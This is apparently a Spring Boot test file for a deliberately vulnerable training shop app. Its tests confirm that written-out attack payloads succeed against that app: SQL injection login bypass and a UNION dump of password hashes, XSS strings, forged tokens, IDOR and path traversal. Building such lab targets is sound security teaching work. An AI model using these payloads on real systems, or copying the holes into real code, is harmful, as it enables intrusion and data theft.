package com.sentinel.shop;

import static com.sentinel.shop.ShopTestSupport.JSON;
import static com.sentinel.shop.ShopTestSupport.bearer;
import static com.sentinel.shop.ShopTestSupport.login;
import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;

import com.fasterxml.jackson.databind.JsonNode;
import com.sentinel.shop.events.LocalEventSink;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Map;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.autoconfigure.web.servlet.MockMvcPrint;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;

/** Every finding in v1 is demonstrably exploitable. If one of these fails, v1 is no longer a valid target. */
@SpringBootTest(properties = {"shop.version=v1", "spring.datasource.url=jdbc:h2:mem:v1test;DB_CLOSE_DELAY=-1"})
@AutoConfigureMockMvc(print = MockMvcPrint.NONE)
class V1VulnerabilitiesTest {
    @Autowired MockMvc mvc;
    @Autowired LocalEventSink sink;

    private String body(MvcResult r) throws Exception {
        return r.getResponse().getContentAsString(StandardCharsets.UTF_8);
    }

    @Test
    void f01_sqlInjectionBypassesLogin() throws Exception {
        MvcResult r = login(mvc, "admin'--", "no-idea");
        assertThat(r.getResponse().getStatus()).isEqualTo(200);
        assertThat(JSON.readTree(body(r)).get("role").asText()).isEqualTo("admin");
        assertThat(login(mvc, "x' OR '1'='1' --", "").getResponse().getStatus()).isEqualTo(200);
    }

    @Test
    void f02_noRateLimitOrLockout() throws Exception {
        for (int i = 0; i < 40; i++) {
            assertThat(login(mvc, "carol", "wrong-" + i).getResponse().getStatus()).isEqualTo(401);
        }
        assertThat(login(mvc, "carol", "qwerty123").getResponse().getStatus()).isEqualTo(200); // never locked
    }

    @Test
    void f03_passwordsAreUnsaltedMd5() throws Exception {
        JsonNode users = JSON.readTree(body(mvc.perform(get("/admin/users")).andReturn()));
        String admin = null;
        for (JsonNode u : users) {
            if (u.get("username").asText().equals("admin")) {
                admin = u.get("password").asText();
            }
        }
        assertThat(admin).isEqualTo("21232f297a57a5a743894a0e4a801fc3"); // md5("admin")
    }

    @Test
    void f04_userEnumerationAndVerboseErrors() throws Exception {
        String unknown = body(login(mvc, "nobody-here", "x"));
        String wrong = body(login(mvc, "alice", "x"));
        assertThat(unknown).contains("unknown user");
        assertThat(wrong).contains("wrong password");
        MvcResult broken = login(mvc, "'", "x");
        assertThat(broken.getResponse().getStatus()).isEqualTo(500);
        assertThat(body(broken)).contains("SELECT id, username, role FROM users"); // SQL text leaked
    }

    @Test
    void f05_tokensAreForgeable() throws Exception {
        String forged = Base64.getEncoder().encodeToString("alice:customer".getBytes(StandardCharsets.UTF_8));
        MvcResult r = mvc.perform(get("/api/orders").header("Authorization", bearer(forged))).andReturn();
        assertThat(r.getResponse().getStatus()).isEqualTo(200); // alice's orders without her password
        assertThat(body(r)).contains("12 Lakeview Rd");
    }

    @Test
    void f06_sqlInjectionInSearchDumpsUserTable() throws Exception {
        String payload = "zzz' UNION SELECT id, username, 0, password FROM users --";
        MvcResult r = mvc.perform(get("/api/search").param("q", payload)).andReturn();
        assertThat(body(r)).contains("admin").contains("21232f297a57a5a743894a0e4a801fc3");
    }

    @Test
    void f07_reflectedXss() throws Exception {
        String xss = "<script>alert(1)</script>";
        assertThat(body(mvc.perform(get("/search").param("q", xss)).andReturn())).contains(xss);
    }

    @Test
    void f08_storedXss() throws Exception {
        String xss = "<img src=x onerror=alert(1)>";
        mvc.perform(post("/api/products/2/comments").contentType(MediaType.APPLICATION_JSON)
                .content(JSON.writeValueAsString(Map.of("author", "eve", "body", xss)))).andReturn();
        assertThat(body(mvc.perform(get("/products/2")).andReturn())).contains(xss);
    }

    @Test
    void f09_idorExposesAnyOrderWithoutLogin() throws Exception {
        MvcResult r = mvc.perform(get("/api/orders/6")).andReturn();
        assertThat(r.getResponse().getStatus()).isEqualTo(200);
        assertThat(body(r)).contains("1 Admin Plaza");
    }

    @Test
    void f10_adminEndpointNeedsNoAuthentication() throws Exception {
        MvcResult r = mvc.perform(get("/admin/users")).andReturn();
        assertThat(r.getResponse().getStatus()).isEqualTo(200);
        assertThat(JSON.readTree(body(r)).size()).isGreaterThanOrEqualTo(4);
    }

    @Test
    void f11_debugEndpointLeaksConfiguration() throws Exception {
        MvcResult r = mvc.perform(get("/debug/config")).andReturn();
        assertThat(r.getResponse().getStatus()).isEqualTo(200);
        assertThat(body(r)).contains("datasourcePassword").contains("admin / admin");
    }

    @Test
    void f12_pathTraversalReadsFilesOutsideTheDirectory() throws Exception {
        MvcResult r = mvc.perform(get("/api/files").param("name", "../secret.txt")).andReturn();
        assertThat(r.getResponse().getStatus()).isEqualTo(200);
        assertThat(body(r)).contains("LAB-ONLY-NOT-A-REAL-SECRET");
    }

    @Test
    void f13_insecureHeadersAndWildcardCors() throws Exception {
        MvcResult r = mvc.perform(get("/api/health")).andReturn();
        assertThat(r.getResponse().getHeader("Access-Control-Allow-Origin")).isEqualTo("*");
        assertThat(r.getResponse().getHeader("Access-Control-Allow-Credentials")).isEqualTo("true");
        assertThat(r.getResponse().getHeader("X-Powered-By")).contains("Spring Boot");
        assertThat(r.getResponse().getHeader("X-Frame-Options")).isNull();
        assertThat(r.getResponse().getHeader("Content-Security-Policy")).isNull();
    }

    @Test
    void f14_errorsExposeInternals() throws Exception {
        MvcResult r = mvc.perform(get("/api/orders/not-a-number")).andReturn();
        assertThat(r.getResponse().getStatus()).isEqualTo(400);
        assertThat(body(r)).contains("MethodArgumentTypeMismatchException");
    }

    @Test
    void formEncodedLoginWorksAndIsEquallyInjectable() throws Exception {
        MvcResult ok = mvc.perform(post("/api/login").contentType(MediaType.APPLICATION_FORM_URLENCODED)
                .param("username", "alice").param("password", "sunshine")).andReturn();
        assertThat(ok.getResponse().getStatus()).isEqualTo(200);
        MvcResult inj = mvc.perform(post("/api/login").contentType(MediaType.APPLICATION_FORM_URLENCODED)
                .param("username", "admin'--").param("password", "x")).andReturn();
        assertThat(JSON.readTree(body(inj)).get("role").asText()).isEqualTo("admin");
        assertThat(mvc.perform(post("/api/login").contentType(MediaType.APPLICATION_FORM_URLENCODED)
                .param("username", "alice").param("password", "no")).andReturn().getResponse().getStatus()).isEqualTo(401);
    }

    @Test
    void unknownRoutesAre404NotServerErrors() throws Exception {
        assertThat(mvc.perform(get("/.env")).andReturn().getResponse().getStatus()).isEqualTo(404);
    }

    @Test
    void accessAndAuthEventsAreEmittedWithRawAttackerInput() throws Exception {
        sink.accessEvents().clear();
        sink.authEvents().clear();
        mvc.perform(get("/api/search?q={q}", "' OR 1=1--").header("User-Agent", "sqlmap/1.7")).andReturn();
        login(mvc, "mallory", "bad");
        login(mvc, "alice", "sunshine");
        var access = sink.accessEvents().get(0);
        assertThat(access.uri()).startsWith("/api/search?q=").contains("OR%201%3D1"); // raw, still encoded
        assertThat(access.userAgent()).isEqualTo("sqlmap/1.7");
        assertThat(access.status()).isEqualTo(200);
        assertThat(sink.authEvents()).extracting(e -> e.username() + ":" + e.outcome())
                .containsExactly("mallory:failure", "alice:success");
    }
}
